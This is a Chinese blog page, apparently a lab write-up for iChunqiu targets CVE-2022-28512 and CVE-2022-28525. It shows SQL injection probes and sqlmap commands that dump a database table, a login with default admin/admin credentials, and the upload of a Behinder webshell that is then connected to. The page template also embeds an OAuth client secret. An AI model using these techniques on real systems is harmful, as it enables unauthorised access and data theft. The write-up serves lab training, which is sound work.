@@ -1,0 +1,364 @@
+<!DOCTYPE HTML>
+<html>
+<head >
+  <meta charset="utf-8">
+  
+  <title>春秋云镜 | Hexo</title>
+
+  
+  <meta name="author" content="John Doe">
+  
+
+  
+  <meta name="description" content="春秋云镜靶机集合CVE-2022-28512靶标介绍：Fantastic Blog (CMS)是一个绝对出色的博客&amp;#x2F;文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该">
+  
+
+  
+  
+  <meta name="keywords" content="">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="春秋云镜"/>
+
+  <meta property="og:site_name" content="Hexo"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+  
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-5005349780815724",
+    enable_page_level_ads: true
+  });
+</script>
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?223eea22355699157e147870eb124b24";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+  <link rel="manifest" href="/manifest.json">
+  <link href="/favicon.ico" rel="icon">
+
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    
+
+    <header class="header-container" style="background-image: url('/images/blog-bg.jpg');">
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <div class="navbar-header page-scroll">
+          <button type="button" id="tglBtn" class="navbar-toggle">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="/">John Doe</a>
+        </div>
+        <div id="bosenyblog-navbar">
+          <div class="navbar-collapse" id="bs-example-navbar-collapse-6">
+            <ul class="nav navbar-nav navbar-right">
+            
+              <li><a href="/">Home</a></li>
+            
+              <li><a href="/archives">Archives</a></li>
+            
+              <li><a href="/about">About</a></li>
+            
+              <li><a href="/tags">Tags</a></li>
+            
+            </ul>
+          </div>
+        </div>
+
+    </div>
+ </nav>
+ <div class="gotop-btn">
+
+ </div>
+</header>
+
+        
+          <div class="container ">
+          <div class="row">
+            <main class="site-main posts-loop col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container" style="position: inherit;">
+            <article class="article-container ">
+
+  
+    
+    <h3 class="article-title"><span>春秋云镜</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/01/19/春秋云镜/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-01-19T04:34:38.000Z">
+          2025-01-19
+        </time>
+      </a>
+    </span>
+    <br />
+    
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h1 id="春秋云镜靶机集合"><a href="#春秋云镜靶机集合" class="headerlink" title="春秋云镜靶机集合"></a>春秋云镜靶机集合</h1><h2 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h2><p>靶标介绍：<br>Fantastic Blog (CMS)是一个绝对出色的博客&#x2F;文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞。</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-1.png"></p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-2.png"></p>
+<p>该网站是一个博客网站，通过URL可以发现一个<strong>id</strong>传参,尝试是否存在sql注入</p>
+<img src="./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-3.png" style="zoom:67%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=4&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>加入引号时出现报错</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-4.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=4&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>加上注释符恢复正常，可以判断存在sql注入，sqlmap梭哈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-5.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot; -d &quot;ctf&quot; --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-6.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot; -D &quot;ctf&quot; -T &quot;flag&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p>成功读取flag</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-7.png"></p>
+<hr>
+<h2 id="CVE-2022-28525"><a href="#CVE-2022-28525" class="headerlink" title="CVE-2022-28525"></a>CVE-2022-28525</h2><p>ED01-CMS v20180505 存在任意文件上传漏洞</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-1.png"></p>
+<p>进来发现是一个博客网站，具体内容无法查看，但是登陆页面是真实存在的</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-2.png"></p>
+<p>尝试用admin注册，显示已经被注册</p>
+<p>其他用户名却无法注册，显示数据库错误，那么只能尝试弱口令看看能不能登陆admin</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-3.png"></p>
+<p>使用admin&#x2F;admin成功登陆管理员页面</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-4.png"></p>
+<p>首先分析一下这个管理页面</p>
+<h3 id="Posts页面"><a href="#Posts页面" class="headerlink" title="Posts页面"></a>Posts页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-5.png"></p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-6.png"></p>
+<h3 id="Comments页面"><a href="#Comments页面" class="headerlink" title="Comments页面"></a>Comments页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-7.png"></p>
+<h3 id="Categories页面"><a href="#Categories页面" class="headerlink" title="Categories页面"></a>Categories页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-8.png"></p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-9.png"></p>
+<h3 id="Users页面"><a href="#Users页面" class="headerlink" title="Users页面"></a>Users页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-10.png"></p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-9.png"></p>
+<h3 id="Profile页面"><a href="#Profile页面" class="headerlink" title="Profile页面"></a>Profile页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-11.png"></p>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h4><p>首先在Posts页面罗列了所有网页上的post，并且提供了添加Post页面，但是尝试后发现这个功能无法正常使用</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-12.png"></p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-13.png"></p>
+<h4 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h4><p>该页面只能删除评论，无法对其进行修改，没发现什么可以利用的点。</p>
+<h4 id="Category"><a href="#Category" class="headerlink" title="Category"></a>Category</h4><p>该页面可以修改Category的Title值，尝试发现存在XSS漏洞</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-14.png"></p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-15.png"></p>
+<h4 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h4><p>该页面可以看到所有的用户，并对他们的信息进行修改</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-16.png"></p>
+<p>在新增用户的页面，发现一个上传点，尝试是否存在文件上传漏洞</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-17.png"></p>
+<p>上传冰蝎马</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-18.png"></p>
+<p>提示上传成功，我们回到所有用户页面</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-19.png"></p>
+<p>可以看到新用户已经在列表中，我们文件上传的木马对应的应该是头像，我们复制头像链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zed1u4xg1v7ietz9tk4.cloudeci1.ichunqiu.com/images/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>连接冰蝎马</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-20.png"></p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-21.png"></p>
+<p>连接成功，获取flag即可</p>
+<p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-22.png"></p>
+
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    
+  
+</article>
+   
+    <div id="toc" class="toc-article ">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E6%9C%BA%E9%9B%86%E5%90%88"><span class="toc-number">1.</span> <span class="toc-text">春秋云镜靶机集合</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-28512"><span class="toc-number">1.1.</span> <span class="toc-text">CVE-2022-28512</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-28525"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2022-28525</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Posts%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.2.1.</span> <span class="toc-text">Posts页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Comments%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.2.2.</span> <span class="toc-text">Comments页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Categories%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.2.3.</span> <span class="toc-text">Categories页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Users%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.2.4.</span> <span class="toc-text">Users页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Profile%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.2.5.</span> <span class="toc-text">Profile页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.6.</span> <span class="toc-text">渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Post"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">Post</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Comments"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">Comments</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Category"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">Category</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Users"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">Users</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+
+
+  
+
+	<!-- async load  -->
+	<script>
+			function async(u, c) {
+				var d = document, t = 'script',
+						o = d.createElement(t),
+						s = d.getElementsByTagName(t)[0];
+				o.src = u;
+				if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+				s.parentNode.insertBefore(o, s);
+			}
+	</script>
+	<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+	<script>
+			async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+					anchors.options = {
+						visible: 'hover',
+						placement: 'left',
+						// icon: '#'
+					};
+					anchors.add().remove('.article-title').remove('.subheading').remove('.sidebar-container h5');
+			})
+	</script>
+	<style>
+			/* place left on bigger screen */
+			@media all and (min-width: 800px) {
+					.anchorjs-link{
+							position: absolute;
+							left: -0.75em;
+							font-size: 1.1em;
+							margin-top : -0.1em;
+					}
+			}
+	</style>
+
+
+
+
+<!-- UY BEGIN -->
+	<div id="gitment-container"></div>
+	<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+	<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+	<script src="/js/web-pinyin.js"></script>
+	<script>
+		function toUnicode(s){ 
+			return s.replace(/([\u4E00-\u9FA5]|[\uFE30-\uFFA0])/g,function(){
+			return "\\u" + RegExp["$1"].charCodeAt(0).toString(16);
+			});
+		}
+		var title = '春秋云镜'
+		var GitHub_id = 'Boseny'
+		var client_id = 'f40c67d0359a2646d2b1'
+		var client_secret = '1cbedbd1a1a2e4b42901aee3d7afe1856c1b7e2d'
+		var repo = 'boseny.me'
+		var gitment = new Gitment({
+		// id: '页面 ID', // 可选。默认为 location.href
+		// id:"11" ,
+		id: title,
+		title: title,
+		owner: GitHub_id,//'你的 GitHub ID',
+		repo: repo,//'存储评论的 repo',
+		oauth: {
+			client_id: client_id,//'你的 client ID',
+			client_secret: client_secret,//'你的 client secret',
+		},
+		})
+		gitment.render('gitment-container')
+	</script>
+<!-- UY END -->
+
+
+
+
+            </main>
+          </div>
+        </div>
+       
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/BosenY/Lap" target="_blank">Lap</a>
+    <br/><span id="busuanzi_container_site_uv"> 
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    </br>
+    
+      
+        &copy; 2025 John Doe
+      
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-92842840-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+  </div>
+
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.bootcss.com/vue/2.5.13/vue.min.js"></script>
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+  <script src="https://unpkg.com/draw-something/dist/draw.min.js"></script>
+  <script>
+    let maxNum = Number.parseInt('10')
+    let iconText = '❤'
+    let color = 'red'
+    new Draw({maxNum, iconText, color})
+  </script>
+
+<script src="/js/index.js"></script>
+<script src="/js/search.js"></script>
+
+</body>
+</html>
